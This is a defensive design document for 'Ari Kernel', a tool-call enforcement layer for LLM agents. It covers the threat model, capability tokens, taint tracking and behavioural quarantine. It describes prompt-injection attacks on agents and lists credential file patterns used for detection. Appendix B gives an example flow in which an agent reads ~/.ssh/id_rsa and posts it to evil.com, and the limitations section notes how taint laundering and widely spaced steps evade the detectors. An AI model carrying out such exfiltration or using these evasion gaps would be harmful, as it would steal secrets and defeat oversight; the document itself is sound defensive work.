# Ari Kernel — Formal Security Model

**Version**: 1.0
**Date**: 2026-03-10
**Audience**: Security researchers, red-teamers, system architects

---

## Table of Contents

1. [Threat Model](#1-threat-model)
2. [Reference Monitor Design](#2-reference-monitor-design)
3. [Capability Security Model](#3-capability-security-model)
4. [Taint Propagation](#4-taint-propagation)
5. [Behavioral Detection](#5-behavioral-detection)
6. [Sidecar Deployment](#6-sidecar-deployment)
7. [Limitations](#7-limitations)
8. [Future Work](#8-future-work)

---

## 1. Threat Model

### 1.1 Core Assumption: Prompt Injection Succeeds

Ari Kernel's threat model begins where prompt-level defenses end. We assume the adversary **has already achieved prompt injection** — the LLM is executing attacker-controlled instructions. This is not a pessimistic assumption; it is a realistic one. Prompt injection remains an open problem with no reliable mitigation at the model layer.

The security goal is **containment**, not prevention. A compromised agent must not be able to:

- Exfiltrate sensitive data to attacker-controlled endpoints
- Execute arbitrary shell commands or system calls
- Escalate from read-only to write/execute privileges
- Access resources outside its granted capability scope
- Tamper with or suppress audit records of its actions

### 1.2 Adversary Model

| Property | Assumption |
|----------|------------|
| **Injection vector** | Attacker controls LLM output via prompt injection (indirect or direct) |
| **Agent capabilities** | Attacker inherits the agent's granted tool access — no more, no less |
| **Runtime trust** | Kernel code is trusted; agent-generated tool calls are untrusted |
| **Host access** | Attacker does NOT have direct host access (see [Limitations](#7-limitations)) |
| **Observation** | Attacker can observe tool call results returned to the LLM context |

### 1.3 Attack Surface

```
                    ┌──────────────────────────────────────────────┐
                    │              UNTRUSTED ZONE                  │
                    │                                              │
                    │   ┌──────────┐     Prompt      ┌─────────┐  │
                    │   │ Attacker │ ──Injection────► │  LLM    │  │
                    │   └──────────┘                  └────┬────┘  │
                    │                                      │       │
                    │                              Tool Call Request│
                    └──────────────────────────────────────┼───────┘
                                                           │
                    ┌──────────────────────────────────────┼───────┐
                    │           ENFORCEMENT BOUNDARY        │       │
                    │                                      ▼       │
                    │   ┌──────────────────────────────────────┐   │
                    │   │          ARI KERNEL                   │   │
                    │   │                                      │   │
                    │   │  ┌────────────┐  ┌──────────────┐   │   │
                    │   │  │ Capability │  │    Policy     │   │   │
                    │   │  │   Token    │  │    Engine     │   │   │
                    │   │  │ Validator  │  │              │   │   │
                    │   │  └─────┬──────┘  └──────┬───────┘   │   │
                    │   │        │                 │           │   │
                    │   │  ┌─────▼─────────────────▼───────┐   │   │
                    │   │  │     Taint Tracker +            │   │   │
                    │   │  │     Behavioral Engine          │   │   │
                    │   │  └─────────────┬─────────────────┘   │   │
                    │   │                │                      │   │
                    │   │         ┌──────▼──────┐              │   │
                    │   │         │ Audit Log   │              │   │
                    │   │         │ (hash chain)│              │   │
                    │   │         └─────────────┘              │   │
                    │   └──────────────────────────────────────┘   │
                    └──────────────────────────────────────┬───────┘
                                                           │
                    ┌──────────────────────────────────────┼───────┐
                    │            PROTECTED ZONE             │       │
                    │                                      ▼       │
                    │   ┌──────┐  ┌──────┐  ┌───────┐  ┌──────┐  │
                    │   │ HTTP │  │ File │  │ Shell │  │  DB  │  │
                    │   └──────┘  └──────┘  └───────┘  └──────┘  │
                    └──────────────────────────────────────────────┘
```

### 1.4 Defended Attack Patterns

| Attack | Mitigation Layer | Mechanism |
|--------|-----------------|-----------|
| Prompt injection → shell exec | Capability + Taint | Token required; tainted input triggers behavioral rule |
| Prompt injection → data exfil | Behavioral Detection | `sensitive_read_then_egress` pattern → quarantine |
| SSRF via crafted URL | Tool Executor | DNS resolution + private IP blocking + redirect validation |
| Path traversal via symlink | Tool Executor | `realpathSync()` canonicalization before allowlist check |
| Shell injection via params | Tool Executor | Metacharacter rejection + direct spawn (`shell: false`) |
| SQL injection from web data | Taint + Behavioral | `tainted_database_write` rule blocks tainted DB mutations |
| Privilege escalation probing | Behavioral Detection | `denied_capability_then_escalation` pattern → quarantine |
| Credential theft + exfil | Behavioral Detection | `secret_access_then_any_egress` pattern → quarantine |
| Regex DoS in policy rules | Policy Engine | 5ms timeout on pattern evaluation (CWE-1333) |
| HTTP method confusion | Tool Executor | Action-derived method; mismatch with `params.method` rejected |
| Audit log tampering | Audit Log | SHA-256 hash chain; tamper-evident on replay |

---

## 2. Reference Monitor Design

### 2.1 Kernel as Enforcement Boundary

Ari Kernel implements an enforcement boundary at the tool execution layer — the interposition point between an AI agent's decision to invoke a tool and the tool's actual execution. Its design draws on the **reference monitor** concept (Anderson, 1972), adapted to the constraints of userspace agent runtimes.

A classical reference monitor requires three properties: complete mediation, tamper-proofness, and verifiability. Ari Kernel approaches but does not fully satisfy these properties. The gap depends on deployment mode:

| Property | Sidecar Mode | Embedded / Middleware Mode |
|----------|-------------|---------------------------|
| **Mediation** | Mandatory — no direct agent→tool path exists (provided the agent has no alternative network/filesystem access to tools) | Cooperative — depends on the framework routing all calls through the kernel. A direct `fetch()` or `fs.readFile()` bypasses enforcement. |
| **Tamper resistance** | Process-isolated — the agent cannot inspect or modify kernel state, policy, or token stores (separate address space). Not tamper-proof against host-level compromise. | In-process — kernel state is in the same memory space as the agent. A sufficiently sophisticated agent or injected code could theoretically inspect or modify kernel internals. |
| **Verifiability** | The 10-step pipeline is deterministic. Hash-chained audit logs enable full decision replay and verification. | Same pipeline, same verifiability. |

Ari Kernel is a **userspace library**, not an OS kernel module. It does not intercept system calls. See [Limitations](#7-limitations) for the full boundary analysis.

### 2.2 Pipeline Architecture

The enforcement pipeline processes every tool call through 10 sequential stages:

```
  Tool Call Request
        │
        ▼
  ┌─────────────┐
  │ 1. VALIDATE  │  Parse, assign ID, timestamp, sequence number
  └──────┬──────┘
         ▼
  ┌─────────────┐
  │ 2. RUN-STATE │  Deny non-safe actions if run is quarantined
  └──────┬──────┘
         ▼
  ┌─────────────┐
  │ 3. TOKEN     │  Verify capability token: signature, expiry, usage limit
  └──────┬──────┘
         ▼
  ┌─────────────┐
  │ 4. TAINT     │  Merge call-level and run-level taint labels
  └──────┬──────┘
         ▼
  ┌─────────────┐
  │ 5. POLICY    │  Evaluate rules in priority order (lower = first)
  └──────┬──────┘
         ▼
  ┌─────────────┐
  │ 6. ENFORCE   │  Deny, require-approval, or allow
  └──────┬──────┘
         ▼
  ┌─────────────┐
  │ 7. EXECUTE   │  Route to tool executor with timeout + size limits
  └──────┬──────┘
         ▼
  ┌─────────────┐
  │ 8. PROPAGATE │  Merge executor auto-taint with propagated input taint
  └──────┬──────┘
         ▼
  ┌─────────────┐
  │ 9. AUDIT     │  Append hash-chained event to tamper-evident store
  └──────┬──────┘
         ▼
  ┌─────────────┐
  │10. BEHAVIOR  │  Evaluate sequence rules against event window
  └──────┬──────┘
         ▼
    Tool Result
```

**Fail-closed semantics**: If any stage fails or encounters an unexpected condition, the tool call is denied. The `require-approval` decision defaults to denial when no approval hook is registered.

### 2.3 Protected Actions

The following tool class / action pairs require a valid capability token:

| Tool Class | Protected Actions |
|------------|-------------------|
| `http` | `get`, `head`, `options`, `post`, `put`, `patch`, `delete` |
| `file` | `read`, `write` |
| `shell` | `exec` |
| `database` | `query`, `exec`, `mutate` |

Unprotected tool classes (`retrieval`, `mcp`, `browser`) may be routed without tokens in embedded mode, but are still subject to policy evaluation, taint tracking, and behavioral detection.

### 2.4 Audit and Tamper Evidence

Every pipeline decision — allow, deny, quarantine — produces a hash-chained audit event:

```
Event[n].hash = SHA-256( Event[n-1].hash || Event[n].data )
```

The genesis event uses 64 zero bytes as its previous hash. Any modification, deletion, or insertion of events breaks the chain and is detected on replay. The audit store uses SQLite with WAL mode for durability. Each event records the full tool call, decision, result, taint state, and timing.

**Hash chain limitations**: The chain provides local tamper evidence. It does NOT provide completeness guarantees (full DB replacement is undetectable without an external anchor), integrity under host compromise (an attacker with DB + app access can recompute valid hashes), or non-repudiation (events are not cryptographically signed with a private key). For production deployments, forward events to an external append-only store (SIEM, CloudTrail, immutable log service).

---

## 3. Capability Security Model

### 3.1 No Ambient Authority

Agents do not receive ambient tool access. Every protected tool call requires a **capability token** — a short-lived, scoped grant that must be presented at invocation time. This eliminates the confused deputy problem: the system distinguishes between "the agent wants to do X" and "the agent is authorized to do X."

### 3.2 Capability Structure

A capability binds a **principal** to a **tool class** with **constraints**:

```
Capability = {
    toolClass:    http | file | shell | database | browser | retrieval | mcp
    actions:      [ "get", "post", ... ]   // subset of tool class actions
    constraints:  CapabilityConstraints     // scope restrictions
}

Principal = {
    id:           ULID                      // unique agent identity
    name:         string
    capabilities: Capability[]              // explicit grants
}
```

### 3.3 Constraints

Constraints narrow a capability's scope. They are checked at execution time — after policy evaluation but before tool dispatch:

| Constraint | Applies To | Semantics |
|------------|-----------|-----------|
| `allowedHosts` | `http` | Hostname must appear in allowlist (or `"*"` for wildcard) |
| `allowedPaths` | `file` | Path must match glob pattern after symlink resolution |
| `allowedCommands` | `shell` | Executable name must appear in allowlist |
| `allowedDatabases` | `database` | Database name must appear in allowlist |
| `maxCallsPerMinute` | all | Sliding-window rate limit per tool class |

Constraints are **conjunctive** — all applicable constraints must be satisfied for the call to proceed.

### 3.4 Capability Tokens

Tokens are cryptographically signed grants with bounded lifetime and usage:

```
CapabilityToken = {
    id:              ULID
    principalId:     string              // bound to issuing principal
    capabilityClass: ToolClass
    constraints:     CapabilityConstraints
    lease: {
        issuedAt:    timestamp
        expiresAt:   timestamp           // default TTL: 5 minutes
        maxCalls:    number              // default: 10 calls
    }
    taintContext:    TaintLabel[]         // taint state at issuance
    signature:       string              // HMAC-SHA256 or Ed25519
}
```

**Signing modes**:

| Mode | Algorithm | Use Case |
|------|-----------|----------|
| Symmetric | HMAC-SHA256 (32+ byte key) | Single-process embedded deployments |
| Asymmetric | Ed25519 | Multi-process sidecar deployments |

**Token verification** (pipeline stage 3):

1. Algorithm match (HMAC vs Ed25519)
2. Cryptographic signature validity (timing-safe comparison)
3. Expiry check: `now ≤ expiresAt`
4. Usage limit: `callsUsed < maxCalls`
5. Principal binding: `token.principalId === caller.principalId`

A failed verification at any step results in immediate denial.

### 3.5 Principal Identity

Each agent operates under a **Principal** — a named identity with a unique ULID. Capabilities are granted per-principal. Tokens are principal-bound: a token issued to Agent A cannot be used by Agent B.

In sidecar mode, the `PrincipalRegistry` maintains per-principal kernel instances with isolated audit logs, ensuring one agent's quarantine state does not affect another.

### 3.6 Capability Delegation

A parent principal may delegate a subset of its capabilities to a child principal. Delegation enforces the **monotonic narrowing invariant**:

```
delegated_capability ⊆ parent_capability
```

- **Action intersection**: Only actions present in BOTH parent and child request are granted
- **Constraint intersection**: The narrowest bounds of each constraint type are applied
- **Delegation chain**: An ordered list of principal IDs from root to current holder, enabling provenance tracing
- **Transitive revocation**: Revoking a parent's delegation cascades to all children in the chain

Delegation never widens. A child cannot gain capabilities the parent does not hold.

---

## 4. Taint Propagation

### 4.1 Data Flow Tracking

Ari Kernel tracks data provenance through **taint labels** — metadata attached to tool call inputs and outputs that record the origin of untrusted data. Taint propagation enables the system to reason about information flow: "this shell command contains data that originated from an HTTP response."

### 4.2 Taint Label Structure

```
TaintLabel = {
    source:      web | rag | email | retrieved-doc | model-generated |
                 user-provided | tool-output
    origin:      string              // e.g., "evil.com", "rag:internal-kb"
    confidence:  0.0 – 1.0           // confidence in provenance attribution
    addedAt:     timestamp
    propagatedFrom?: string          // call ID of originating tool call
}
```

### 4.3 Taint Sources and Auto-Labeling

The following tool executors automatically apply taint labels to their output — no manual labeling required:

| Executor | Taint Label | Trigger |
|----------|-------------|---------|
| `HttpExecutor` | `web:<hostname>` | Any HTTP response |
| `RetrievalExecutor` | `rag:<source>` | RAG document retrieval |
| `McpDispatchExecutor` | `web:<host>` / `rag:<source>` / `tool-output:mcp` | MCP tool invocation |

### 4.4 Propagation Model

Taint propagation is **monotonic** — labels accumulate and are never stripped:

```
                  ┌──────────────┐
                  │  HTTP GET    │
                  │  evil.com    │
                  └──────┬───────┘
                         │ output taint: { web:evil.com }
                         ▼
                  ┌──────────────┐
                  │  Parse JSON  │  input inherits taint from upstream
                  │              │
                  └──────┬───────┘
                         │ output taint: { web:evil.com }
                         ▼
                  ┌──────────────┐
                  │  shell.exec  │  ◄── BLOCKED: web-tainted input
                  │  "curl ..."  │      triggers behavioral rule
                  └──────────────┘
```

**Three propagation operations**:

1. **Attach**: Create a new `TaintLabel` at a system boundary (auto-taint by executor)
2. **Propagate**: Forward input taint labels to output, linking via `propagatedFrom` call ID
3. **Merge**: Union multiple taint sets when data from different sources combines

### 4.5 Run-Level Taint State

The kernel maintains a persistent taint state per run:

```
TaintState = {
    tainted:     boolean         // set once, never resets
    sources:     Set<string>     // observed taint source types
    labels:      TaintLabel[]    // accumulated labels (deduped by source:origin)
}
```

Once the run processes untrusted external data, the `tainted` flag is set permanently. This flag influences policy evaluation and behavioral rules for all subsequent tool calls in the session.

### 4.6 Taint Propagation Boundaries

| Property | Full Pipeline | Middleware Mode |
|----------|--------------|-----------------|
| Policy evaluation with taint | Yes | Yes |
| Behavioral quarantine on taint | Yes | Yes |
| Auto-taint on HTTP responses | Yes | Optional (`autoTaint: true`) |
| Taint labels on tool results | Yes | No |
| Multi-hop taint propagation | Yes | Input taint only |

Middleware mode provides permit-or-deny enforcement with zero architecture changes. For maximum taint fidelity — full provenance chain across multi-hop tool sequences — use the full pipeline with real executors.

---

## 5. Behavioral Detection

### 5.1 Sequence Detection

Static policy rules evaluate individual tool calls in isolation. Behavioral detection operates over **sequences of events**, identifying multi-step attack patterns that no single-call policy can catch.

A **sliding event window** (bounded FIFO buffer, last 20 events) stores normalized security events:

```
SecurityEvent =
    | capability_requested
    | capability_denied
    | capability_granted
    | tool_call_allowed
    | tool_call_denied
    | taint_observed
    | sensitive_read_attempt
    | sensitive_read_allowed
    | egress_attempt
    | quarantine_entered
```

### 5.2 Detection Rules

Six built-in rules evaluate patterns against the event window after every pipeline execution:

```
  Rule: web_taint_sensitive_probe
  ─────────────────────────────────
  taint_observed(web|rag|email)  ──►  sensitive_read | shell.exec | egress
  Detects: Prompt injection causing access to secrets after processing
           untrusted content.

  Rule: denied_capability_then_escalation
  ────────────────────────────────────────
  capability_denied  ──►  capability_requested(higher risk class)
  Detects: Automated privilege escalation probing.
           Risk ordering: http(1) < database(2) < file(3) < shell(5)

  Rule: sensitive_read_then_egress
  ─────────────────────────────────
  sensitive_read_attempt  ──►  egress_attempt
  Detects: Data staging followed by exfiltration — reading credentials,
           then attempting outbound HTTP write.

  Rule: tainted_database_write
  ─────────────────────────────
  taint_observed(web|rag|email)  ──►  database.{exec|mutate}
  Detects: Tainted data written to database — SQL injection from
           untrusted input.

  Rule: tainted_shell_with_data
  ──────────────────────────────
  taint_observed(web|rag|email)  ──►  shell.exec (command > 100 chars)
  Detects: Data piped or exfiltrated via shell command arguments
           after processing untrusted input.

  Rule: secret_access_then_any_egress
  ────────────────────────────────────
  secret/credential resource access  ──►  any egress attempt
  Detects: Credential theft — accessing secrets, vault endpoints,
           or credential files, followed by outbound communication.
```

Rules fire on the **first match**. The system does not wait for threshold counters — a single occurrence of the pattern is sufficient to trigger quarantine.

### 5.3 Sensitive Resource Identification

The following path patterns are classified as sensitive and trigger `sensitive_read_attempt` events:

```
.ssh/*    .env    .aws/*    credentials*    password*
secret*   .gnupg/*    id_rsa*    .kube/config    token*
```

### 5.4 Quarantine

When a behavioral rule matches — or when denial counters exceed the configurable threshold (default: 5) — the run enters **restricted mode** (quarantine).

```
  ┌─────────────────────────────────────────────────────┐
  │                   QUARANTINE STATE                   │
  │                                                     │
  │  ALLOWED (read-only):                               │
  │    http.get   http.head   http.options              │
  │    file.read                                        │
  │    database.query                                   │
  │                                                     │
  │  BLOCKED (all write/execute/egress):                │
  │    http.post  http.put  http.patch  http.delete     │
  │    file.write                                       │
  │    shell.exec                                       │
  │    database.exec  database.mutate                   │
  │                                                     │
  │  Properties:                                        │
  │    • Immediate — no grace period                    │
  │    • Irrecoverable — no exit within the run         │
  │    • The triggering action is itself denied          │
  │    • Suspicious GET exfil patterns also blocked     │
  └─────────────────────────────────────────────────────┘
```

The design principle is **containment**: a compromised agent session is isolated, not rehabilitated. Quarantine produces a `QuarantineInfo` record:

```
QuarantineInfo = {
    trigger:         "behavioral_rule" | "threshold"
    ruleId:          string
    reason:          string              // human-readable explanation
    countersSnapshot: CounterState       // counters at quarantine time
    matchedEvents:   SecurityEvent[]     // events forming the pattern
    timestamp:       ISO 8601
}
```

---

## 6. Sidecar Deployment

### 6.1 Process-Boundary Isolation

The sidecar is Ari Kernel's **highest-assurance deployment mode**. It runs the enforcement pipeline in a separate process, creating a hard boundary between the agent and the tools:

```
  ┌─────────────────────┐          ┌──────────────────────────┐
  │    AGENT PROCESS     │          │    SIDECAR PROCESS       │
  │                      │          │                          │
  │  ┌────────┐          │   HTTP   │  ┌────────────────────┐  │
  │  │  LLM   │          │ ◄──────► │  │  ARI KERNEL        │  │
  │  └───┬────┘          │  :8787   │  │                    │  │
  │      │               │          │  │  ┌──────────────┐  │  │
  │  ┌───▼────────────┐  │          │  │  │ Policy Engine│  │  │
  │  │ Sidecar Client │──┼──────────┼──│  │ Taint Track  │  │  │
  │  └────────────────┘  │          │  │  │ Token Store  │  │  │
  │                      │          │  │  │ Audit Log    │  │  │
  │  ┌────────────────┐  │          │  │  │ Behavioral   │  │  │
  │  │ Sidecar Guard  │  │          │  │  └──────────────┘  │  │
  │  │ (fetch + shell │  │          │  │                    │  │
  │  │  interception) │  │          │  │  ┌──────────────┐  │  │
  │  └────────────────┘  │          │  │  │ Tool         │  │  │
  │                      │          │  │  │ Executors    │  │  │
  └─────────────────────┘          │  │  └──────────────┘  │  │
                                    │  └────────────────────┘  │
                                    │                          │
                                    │  Principal Registry      │
                                    │  (per-agent isolation)   │
                                    └──────────────────────────┘
```

### 6.2 Sidecar Server

The sidecar exposes three HTTP endpoints:

| Endpoint | Method | Auth | Purpose |
|----------|--------|------|---------|
| `/health` | GET | No | Liveness probe |
| `/execute` | POST | Bearer token | Tool call enforcement |
| `/status` | GET | Bearer token | Query quarantine/counter state |

The `PrincipalRegistry` maintains per-principal kernel instances. Each principal gets an isolated pipeline, audit log, and run state. One agent's quarantine does not affect another.

### 6.3 Sidecar Guard (Runtime Mediation)

The `SidecarGuard` module intercepts Node.js runtime APIs to prevent accidental bypass:

- **`globalThis.fetch`**: Intercepted; HTTP requests routed through the sidecar client
- **`child_process.*`**: `spawn`, `exec`, `execFile` intercepted; shell commands routed through sidecar

This ensures that even if agent code calls `fetch()` or `child_process.exec()` directly, the call is mediated by the kernel. This is **cooperative interception**, not OS-level syscall hooking (see [Limitations](#7-limitations)).

### 6.4 Deployment Mode Comparison

| Property | Middleware | Embedded | Sidecar |
|----------|-----------|----------|---------|
| **Enforcement** | Cooperative | Cooperative | Mandatory (process boundary) |
| **Bypass risk** | Higher — framework bug bypasses | Moderate — app must route all calls | Reduced — no direct agent→tool path |
| **Audit isolation** | In-process | In-process | Separate process |
| **Token store isolation** | In-process (agent can inspect) | In-process (agent can inspect) | Isolated process (agent cannot access) |
| **Taint fidelity** | Stub executors (partial) | Real executors (full) | Real executors (full) |
| **Latency** | Microseconds | Microseconds | Milliseconds (HTTP round-trip) |
| **Language support** | TypeScript only | TypeScript only | Any (HTTP client) |

### 6.5 Trust Boundary Analysis

In embedded/middleware mode, the kernel and agent share a process. A sufficiently sophisticated agent (or injected code) could theoretically inspect kernel memory, read token stores, or call tools directly. The enforcement is **cooperative** — it depends on the framework routing all calls through the kernel.

In sidecar mode, the kernel runs in a separate process with a separate address space. The agent communicates only via authenticated HTTP. There is no shared memory, no shared token store, and no direct function call path to tool executors. The enforcement is **mandatory** within the scope of the process boundary.

---

## 7. Limitations

### 7.1 Cooperative Runtime

Ari Kernel operates as a **userspace library**, not an OS kernel module. It does not intercept system calls, and it does not enforce mandatory access control at the operating system level.

**Implications**:

- In embedded/middleware mode, enforcement depends entirely on the host application routing all tool calls through the kernel. A direct `fetch()` call or `fs.readFile()` that bypasses the kernel is not intercepted.
- The Sidecar Guard intercepts common Node.js APIs (`fetch`, `child_process`), but this is monkey-patching, not syscall interception. Native addons, FFI calls, or other runtime environments are not mediated.
- If the agent process has ambient OS-level permissions (e.g., filesystem access, network access), a code execution vulnerability could bypass the kernel entirely.

### 7.2 Not OS Syscall Interception

Ari Kernel does NOT provide:

- **Seccomp/AppArmor/SELinux enforcement** — no kernel-level sandboxing
- **Network namespace isolation** — no iptables or eBPF filtering
- **Filesystem mount isolation** — no chroot or overlay filesystems
- **Process isolation** — no cgroups or container boundaries (except sidecar's process separation)

For these guarantees, deploy the agent within a hardened container or VM and use Ari Kernel as the application-layer enforcement within that boundary.

### 7.3 Hash Chain Limitations

The tamper-evident audit log provides **local consistency guarantees**, not absolute integrity:

- Full database replacement is undetectable without an external anchor
- An attacker with both DB and application access can recompute valid hashes
- Events are not cryptographically signed — the chain proves consistency, not authorship

### 7.4 Taint Model Limitations

- Taint tracking is **label-based**, not **byte-level** — it tracks which tool calls have tainted provenance, not which bytes within a response are tainted
- Taint can be laundered if the agent reformulates data across calls in a way that severs the provenance chain (e.g., summarizing tainted content, then using the summary)
- Auto-taint depends on using kernel-managed executors — external tool execution bypasses auto-labeling

### 7.5 Behavioral Detection Limitations

- Six hardcoded rules — no user-defined custom rules (yet)
- Pattern matching is sequence-based, not semantic — the system detects "A then B" patterns, not adversarial intent
- Window size (20 events) bounds detection scope — long-horizon attacks that space steps across many events may evade detection
- Rules fire on structural patterns, not data content — a benign "read config then POST status" sequence is indistinguishable from exfiltration without additional context

---

## 8. Future Work

### 8.1 Capability Tokens — Extended Model

- **Persistent token store**: Currently tokens are in-memory and lost on process restart. A persistent store (SQLite, Redis) would enable durable grants across restarts.
- **Token revocation lists**: Broadcast revocation events across distributed sidecar instances for multi-node deployments.
- **Delegated token issuance**: Allow sub-agents to request tokens from their parent, subject to the delegation narrowing invariant, without returning to the root authority.

### 8.2 Capability Delegation — Formal Model

- **Lattice-based delegation**: Model capability delegation as a lattice where the meet operation (∩) defines the delegated capability. Formally verify that delegation is monotonically narrowing.
- **Delegation depth limits**: Configurable maximum chain length to prevent unbounded transitive delegation.
- **Temporal delegation**: Capabilities that expire not just by wall-clock time but by event count or run phase.

### 8.3 OS-Level Sandboxing Integration

- **Seccomp-BPF profiles**: Generate minimal syscall allowlists from declared capabilities (e.g., an `http`-only agent needs `connect`, `sendto`, `recvfrom` but not `execve`).
- **Landlock**: File-path-based access control at the kernel level, mirroring `allowedPaths` constraints.
- **gVisor / Firecracker**: Lightweight VM isolation for maximum containment.
- **Network policy**: eBPF-based egress filtering that mirrors `allowedHosts` constraints at the network layer.

### 8.4 User-Defined Behavioral Rules

- **Rule DSL**: A declarative language for expressing multi-step attack patterns, replacing hardcoded rules.
- **Configurable thresholds**: Per-rule confidence levels, window sizes, and quarantine severity.
- **Anomaly detection**: Statistical baselines for "normal" agent behavior with alerts on deviation.

### 8.5 Multi-Agent Coordination

- **Cross-agent taint propagation**: Track data flow across agent boundaries in multi-agent systems.
- **Shared quarantine**: Quarantining one agent in a coordinated group can restrict others that share data.
- **Federated audit**: Unified audit trail across multiple sidecar instances.

### 8.6 Formal Verification

- **Policy completeness**: Prove that the default deny-all policy, combined with user-supplied rules, covers all tool class / action pairs without gaps.
- **Delegation safety**: Formally verify that the delegation intersection operation never widens capabilities.
- **Information flow**: Type-level taint tracking to guarantee at compile time that tainted data cannot reach sensitive sinks without policy evaluation.

---

## Appendix A: System Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          ARI KERNEL ARCHITECTURE                            │
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │                         AGENT LAYER                                 │    │
│  │                                                                     │    │
│  │   ┌───────────┐    ┌───────────┐    ┌───────────┐    ┌──────────┐  │    │
│  │   │ LangChain │    │  CrewAI   │    │  OpenAI   │    │  Custom  │  │    │
│  │   │  Agent    │    │  Agent    │    │  Agent    │    │  Agent   │  │    │
│  │   └─────┬─────┘    └─────┬─────┘    └─────┬─────┘    └────┬─────┘  │    │
│  │         │                │                │               │        │    │
│  │         └────────────────┼────────────────┼───────────────┘        │    │
│  │                          │                │                        │    │
│  │                   ┌──────▼────────────────▼──────┐                 │    │
│  │                   │   Middleware / Adapter Layer  │                 │    │
│  │                   └──────────────┬───────────────┘                 │    │
│  └──────────────────────────────────┼─────────────────────────────────┘    │
│                                     │                                      │
│  ┌──────────────────────────────────▼─────────────────────────────────┐    │
│  │                        KERNEL LAYER                                │    │
│  │                                                                    │    │
│  │  ┌────────────┐  ┌────────────┐  ┌─────────────┐  ┌───────────┐  │    │
│  │  │  Principal  │  │ Capability │  │   Policy    │  │   Taint   │  │    │
│  │  │  Registry  │  │   Token    │  │   Engine    │  │  Tracker  │  │    │
│  │  │            │  │   Store    │  │             │  │           │  │    │
│  │  └────────────┘  └────────────┘  └─────────────┘  └───────────┘  │    │
│  │                                                                    │    │
│  │  ┌──────────────────────────────────────────────────────────────┐  │    │
│  │  │                  ENFORCEMENT PIPELINE                        │  │    │
│  │  │  Validate → RunState → Token → Taint → Policy → Execute     │  │    │
│  │  │  → Propagate → Audit → Behavioral Detection                 │  │    │
│  │  └──────────────────────────────────────────────────────────────┘  │    │
│  │                                                                    │    │
│  │  ┌────────────┐  ┌────────────┐                                   │    │
│  │  │ Behavioral │  │  Audit Log │                                   │    │
│  │  │   Engine   │  │ (SHA-256   │                                   │    │
│  │  │            │  │  hash chain│                                   │    │
│  │  └────────────┘  └────────────┘                                   │    │
│  └────────────────────────────────┬───────────────────────────────────┘    │
│                                   │                                        │
│  ┌────────────────────────────────▼───────────────────────────────────┐    │
│  │                       EXECUTOR LAYER                               │    │
│  │                                                                    │    │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐         │    │
│  │  │   HTTP   │  │   File   │  │  Shell   │  │ Database │         │    │
│  │  │ Executor │  │ Executor │  │ Executor │  │ Executor │         │    │
│  │  │          │  │          │  │          │  │          │         │    │
│  │  │ • SSRF   │  │ • Symlink│  │ • Meta-  │  │ • Query  │         │    │
│  │  │   guard  │  │   resolve│  │   char   │  │   param  │         │    │
│  │  │ • Method │  │ • Path   │  │   block  │  │   check  │         │    │
│  │  │   enforce│  │   allow  │  │ • Direct │  │          │         │    │
│  │  │ • Auto-  │  │   list   │  │   spawn  │  │          │         │    │
│  │  │   taint  │  │          │  │          │  │          │         │    │
│  │  └──────────┘  └──────────┘  └──────────┘  └──────────┘         │    │
│  └────────────────────────────────────────────────────────────────────┘    │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Appendix B: Attack Containment Flow

```
  ATTACK: Prompt injection → read ~/.ssh/id_rsa → POST to evil.com

  Step 1: LLM (compromised) generates tool call: file.read("~/.ssh/id_rsa")
           │
           ▼
  Step 2: Pipeline evaluates → file.read is allowed (agent has file.read cap)
          BUT: path matches sensitive pattern → sensitive_read_attempt event logged
           │
           ▼
  Step 3: LLM generates tool call: http.post("https://evil.com", data=key_content)
           │
           ▼
  Step 4: Pipeline evaluates → egress_attempt event logged
          Behavioral engine checks window:
            [sensitive_read_attempt] → [egress_attempt]
            MATCH: sensitive_read_then_egress rule
           │
           ▼
  Step 5: QUARANTINE triggered
          • http.post is DENIED (triggering action blocked)
          • Run enters restricted mode
          • All future write/execute/egress DENIED
          • QuarantineInfo recorded in audit log
           │
           ▼
  Step 6: Agent can still read files (degraded operation)
          but cannot exfiltrate, execute, or write
          for the remainder of the session.

  RESULT: Key material read but never exfiltrated.
          Audit trail captures full attack sequence.
```

## Appendix C: Glossary

| Term | Definition |
|------|-----------|
| **Capability** | A scoped grant binding a principal to a tool class, actions, and constraints |
| **Capability Token** | A cryptographically signed, time-limited, usage-limited credential proving capability |
| **Constraint** | A restriction narrowing a capability's scope (allowed hosts, paths, commands, rate limits) |
| **Delegation** | Transferring a subset of capabilities from parent to child principal |
| **Egress** | Outbound data transmission (HTTP POST/PUT/PATCH/DELETE) |
| **Monotonic Narrowing** | The invariant that delegation never widens capabilities |
| **Principal** | A named agent identity with a unique ID and explicit capability grants |
| **Quarantine** | Irrecoverable restricted mode that limits a run to read-only operations |
| **Reference Monitor** | A security concept (Anderson, 1972) defining an enforcement boundary with complete mediation, tamper-proofness, and verifiability. Ari Kernel draws on this model but only approaches these properties in sidecar mode. |
| **Taint Label** | Metadata recording data provenance (source, origin, confidence) |
| **Taint Propagation** | Forward flow of taint labels from tool inputs to outputs |
